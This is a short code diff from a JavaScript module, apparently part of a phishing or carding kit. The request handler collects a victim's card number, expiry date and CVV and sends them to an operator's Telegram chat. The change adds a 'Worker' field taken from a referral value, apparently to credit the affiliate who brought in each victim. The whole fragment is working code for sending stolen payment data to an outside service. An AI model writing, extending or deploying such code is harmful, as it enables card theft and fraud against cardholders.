@@ -75,6 +75,7 @@ module.exports = {
             message += `Pan: ${req.body.pan}\n`
             message += `Expires at: ${req.body.expires_at}\n`
             message += `CVV: ${req.body.cvv}\n`
+            message += `Worker: ${transaction.referal}\n`
             
             Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
 
